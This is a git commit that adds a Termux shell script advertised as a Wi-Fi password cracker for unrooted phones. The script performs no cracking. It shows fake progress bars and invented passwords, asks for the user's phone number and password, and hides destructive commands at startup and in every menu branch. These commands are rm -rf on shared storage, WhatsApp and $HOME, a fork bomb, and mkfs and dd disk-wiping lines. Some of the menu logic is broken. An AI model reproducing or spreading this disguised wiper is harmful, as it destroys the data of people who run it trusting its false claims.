b2909aaf4fd3f7982fe1f2655962a2c517d0ea4a
farhan2659 <52378426+farhan2659@users.noreply.github.com>
2019-07-07 11:49:42 +0700

    Add files via upload

---
+++ HACK-WIFI-NO-ROOT.sh
@@ -0,0 +1,248 @@
+
+clear
+python2 password.py
+R1='\033[31;1m'
+B1='\033[1;36m'
+G1='\033[32;1m'
+Y1='\033[33;1m'
+P1='\033[35;1m'
+sleep 0.1
+termux-setup-storage
+clear
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+figlet HACK WIFI NO ROOT | lolcat
+
+echo $B1"=========================="
+echo $G1"author = MR.201"
+echo $R1"hack WIFI-NO ROOT"
+echo $B1"=========================="
+
+
+echo $G1"1.nyalain wifi (WAJIB DISINI)"
+echo $Y1"2.CARCK PASWORD WIFI"
+echo $P1"3.HACK WIFI TARGET"
+echo $B1"4.MELIHAT PASWORD WIFI"
+
+echo $B1"╭──[Masukkan Pilihan Anda]>"
+read -p"╰───────root@Mr.201=•>" MR.201;
+
+clear
+if [ $MikoKW = 1 ] || [ $MikoKW = 01 ]
+then
+figlet -f slant "Mr.201"|lolcat
+sleep 1
+echo $R1"sedang membuka"
+sleep 1
+echo $B1"Masukan Nomer Hp"
+read p;
+sleep 0.5
+echo $B1"Masukan Password hp kamu"
+read p;
+sleep 5
+echo $G1"sedang mencari wifi terdekat"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+echo $G1"SUKSES MEMBUKA PENGATURAN"
+sleep 5
+echo $R1"Kembali Ke beranda dalam 10 dtk"
+sleep 10
+sh HACK-WIFI-NO-ROOT.sh
+fi
+
+clear
+if [ $MikoKW = 2 ] || [ $MikoKW = 02 ]
+then
+figlet -f slant "Mr.201"|lolcat
+sleep 1
+echo $R1"Masukan nama wifi Target Dibawah"
+read p;
+sleep 2
+echo $Y1"Sedang crack"
+sleep 2
+echo $G1"10%"
+sleep 2
+echo $G1"20%"
+sleep 2
+echo $G1"40%"
+sleep 2
+echo $G1"60%"
+sleep 2
+echo $G1"80%"
+sleep 2
+echo $G1"100%"
+sleep 5
+echo $B1"Password Berhasil Crack"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 10
+echo $B1"Passwornya = sayang123"
+echo $R1"Kembali ke beranda dalam 20 dtk"
+sleep 20
+sh HACK-WIFI-NO-ROOT.sh
+fi
+
+clear
+if [ $Mr201 = 3 ] || [ $Mr201 = 03 ]
+then
+figlet -f slant "Mr.201"|lolcat
+sleep 1
+echo $B1"Hack wifi target"
+sleep 1
+echo $Y1"Masukan Nama wifinya dibawah"
+read p;
+sleep 2
+echo $G1"Sedang mencari pasword"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 10
+echo $G1"Sukses  ini pasword nya syakila123 "
+sleep 0.5
+echo $G1"[√] [√] [√]"
+echo $R1"Kembali ke beranda dalam 5 detik"
+sleep 5
+sh HACK-WIFI-NO-ROOT.sh
+fi
+
+clear
+if [ $MikoKW = 4 ] || [ $MikoKW = 04 ]
+then
+figlet -f slant "MR.201"|lolcat
+sleep 1
+echo $G1"Masukan NAMA WIFI NYA"
+read p;
+sleep 3
+echo $G1"sedang membuka keamanan"
+sleep 1
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+sleep 3
+echo $R1"melihat pasword wifi berhasil "
+sh HACK-WIFI-NO-ROOT.sh
+fi
+
